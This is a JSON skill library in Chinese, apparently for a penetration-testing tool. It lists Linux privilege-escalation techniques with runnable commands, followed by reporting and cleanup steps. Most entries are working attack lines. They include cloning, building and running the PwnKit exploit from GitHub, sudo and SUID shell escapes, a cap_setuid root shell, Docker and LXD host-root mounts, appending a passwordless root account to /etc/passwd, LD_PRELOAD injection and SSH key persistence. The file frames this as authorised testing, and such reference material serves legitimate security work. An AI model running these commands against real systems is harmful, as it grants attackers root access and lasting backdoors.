[{"id":"lx-kernel-dirtypipe","n":"Dirty Pipe 提权","cat":"Linux提权","phase":"exploit","d":"CVE-2022-0847 覆写只读文件获得 root。","cmds":["gcc exp.c -o exp && ./exp /etc/passwd"],"tools":["gcc"],"tags":["kernel","cve"]},{"id":"lx-kernel-pwnkit","n":"PwnKit 提权","cat":"Linux提权","phase":"exploit","d":"CVE-2021-4034 pkexec 参数越界执行。","cmds":["cd /tmp && git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034 && make && ./cve-2021-4034"],"tools":["gcc"],"tags":["kernel","cve"]},{"id":"lx-sudo-baron","n":"Baron Samedit","cat":"Linux提权","phase":"exploit","d":"CVE-2021-3156 sudo 堆溢出。","cmds":["./exploit_nss"],"tools":["gcc"],"tags":["sudo","cve"]},{"id":"lx-sudo-nopasswd","n":"sudo 免密与参数滥用","cat":"Linux提权","phase":"exploit","d":"用 NOPASSWD 条目调用 shell 逃逸。","cmds":["sudo -l","sudo vim -c ':!/bin/sh'"],"tools":["sudo"],"tags":["sudo"]},{"id":"lx-suid","n":"SUID 二进制提权","cat":"Linux提权","phase":"exploit","d":"用 GTFOBins 中的 SUID 程序逃逸。","cmds":["find / -perm -4000 -type f 2>/dev/null","/usr/bin/find . -exec /bin/sh \\; -quit"],"tools":["find"],"tags":["suid"]},{"id":"lx-cron-writable","n":"计划任务劫持","cat":"Linux提权","phase":"exploit","d":"写入可执行的 cron 脚本提升权限。","cmds":["cat /etc/crontab; ls -l /etc/cron.d"],"tools":["crontab"],"tags":["cron"]},{"id":"lx-cap-setuid","n":"Capabilities 滥用","cat":"Linux提权","phase":"exploit","d":"用 cap_setuid 的程序切到 root。","cmds":["getcap -r / 2>/dev/null","/usr/bin/python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"],"tools":["getcap"],"tags":["capability"]},{"id":"lx-nfs-nosquash","n":"NFS no_root_squash","cat":"Linux提权","phase":"exploit","d":"在共享目录放置 SUID 程序提升权限。","cmds":["showmount -e <ip>","mount -t nfs <ip>:/export /mnt"],"tools":["mount"],"tags":["nfs"]},{"id":"lx-docker-group","n":"Docker 组逃逸","cat":"Linux提权","phase":"exploit","d":"挂载宿主根目录到容器内取得 root。","cmds":["docker run -v /:/host -it alpine chroot /host"],"tools":["docker"],"tags":["docker"]},{"id":"lx-lxd-group","n":"LXD 组逃逸","cat":"Linux提权","phase":"exploit","d":"用 privileged 容器挂载宿主根。","cmds":["lxc init alpine p -c security.privileged=true","lxc config device add p h disk source=/ path=/mnt/root recursive=true"],"tools":["lxc"],"tags":["lxd"]},{"id":"lx-passwd-writable","n":"可写 passwd/shadow","cat":"Linux提权","phase":"exploit","d":"直接追加无口令 root 账号。","cmds":["echo 'pwn::0:0:root:/root:/bin/bash' >> /etc/passwd"],"tools":["sh"],"tags":["passwd"]},{"id":"lx-path-hijack","n":"PATH 劫持","cat":"Linux提权","phase":"exploit","d":"在优先目录放置同名可执行文件。","cmds":["echo $PATH; find / -writable -type d 2>/dev/null"],"tools":["sh"],"tags":["path"]},{"id":"lx-ld-preload","n":"LD_PRELOAD 注入","cat":"Linux提权","phase":"exploit","d":"用 sudo 保留环境变量加载恶意库。","cmds":["gcc -shared -fPIC -o x.so x.c; sudo LD_PRELOAD=./x.so <bin>"],"tools":["gcc"],"tags":["preload"]},{"id":"lx-python-lib","n":"Python 库劫持","cat":"Linux提权","phase":"exploit","d":"在可写 sys.path 目录放置同名模块。","cmds":["python3 -c 'import sys;print(sys.path)'"],"tools":["python"],"tags":["path"]},{"id":"lx-logrotat","n":"日志轮转脚本劫持","cat":"Linux提权","phase":"exploit","d":"替换 logrotate 调用中的可写脚本。","cmds":["cat /etc/logrotate.d/* 2>/dev/null | head"],"tools":["logrotate"],"tags":["cron"]},{"id":"lx-motd","n":"MOTD 脚本注入","cat":"Linux提权","phase":"exploit","d":"写 update-motd.d 脚本在登录时以 root 执行。","cmds":["ls -l /etc/update-motd.d/"],"tools":["sh"],"tags":["persist"]},{"id":"lx-ssh-key","n":"SSH 密钥持久化","cat":"Linux提权","phase":"exploit","d":"写入 authorized_keys 维持访问。","cmds":["echo '<pubkey>' >> /root/.ssh/authorized_keys"],"tools":["ssh"],"tags":["persist"]},{"id":"lx-webshell-root","n":"Web 到 root 链路","cat":"Linux提权","phase":"exploit","d":"从 www-data 逐步提权到 root 并取证。","cmds":["linpeas.sh -a"],"tools":["linpeas"],"tags":["privesc"]},{"id":"lx-container-escape","n":"容器内提权逃逸","cat":"Linux提权","phase":"exploit","d":"检查 cgroup、procfs 与内核模块面。","cmds":["cat /proc/1/cgroup; ls -la /proc/1/root; capsh --print"],"tools":["cdk"],"tags":["escape"]},{"id":"mc-report-evidence","n":"证据固化与截图","cat":"报告复盘","phase":"report","d":"保存请求响应原文、时间戳与复现步骤。","cmds":["curl -i https://<host>/x > evidence.txt"],"tools":["curl"],"tags":["report"]},{"id":"mc-cvss-rate","n":"CVSS 与风险定级","cat":"报告复盘","phase":"report","d":"按可利用性与影响面给出统一评级。","cmds":["echo 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'"],"tools":["calc"],"tags":["report"]},{"id":"mc-report-write","n":"报告撰写","cat":"报告复盘","phase":"report","d":"按概述、复现、影响、修复四段式输出。","cmds":["pandoc report.md -o report.pdf"],"tools":["pandoc"],"tags":["report"]},{"id":"mc-retest","n":"漏洞复测","cat":"报告复盘","phase":"report","d":"修复后重放请求确认闭环。","cmds":["curl -i 'https://<host>/x?id=1%27'"],"tools":["curl"],"tags":["retest"]},{"id":"mc-archive","n":"任务归档与知识沉淀","cat":"报告复盘","phase":"report","d":"归档资产、漏洞与技能命中情况供复用。","cmds":["tar czf task.tgz evidence/ report.md"],"tools":["tar"],"tags":["archive"]},{"id":"mc-scope-check","n":"授权范围核对","cat":"报告复盘","phase":"report","d":"确认测试目标均在授权清单内。","cmds":["comm -12 <(sort scope.txt) <(sort tested.txt)"],"tools":["sh"],"tags":["scope"]},{"id":"mc-cleanup","n":"环境清理","cat":"报告复盘","phase":"report","d":"清理上传文件、账号与临时任务。","cmds":["rm -f /tmp/x.php; userdel test"],"tools":["sh"],"tags":["cleanup"]},{"id":"mc-knowledge-merge","n":"技能知识合并","cat":"报告复盘","phase":"report","d":"把新打法沉淀到技能库并标注命中率。","cmds":["cp new-skill.json resources/skills/"],"tools":["sh"],"tags":["knowledge"]},{"id":"mc-cve-lookup","n":"CVE 匹配与验证","cat":"报告复盘","phase":"report","d":"按指纹匹配本地 CVE 库并验证可利用性。","cmds":["nuclei -u https://<host> -id <CVE-ID>"],"tools":["nuclei"],"tags":["cve"]},{"id":"mc-benchmark","n":"攻击面覆盖率核对","cat":"报告复盘","phase":"report","d":"对照资产图确认高价值面已覆盖。","cmds":["httpx -l alive.txt -mc all -o cover.txt"],"tools":["httpx"],"tags":["coverage"]}]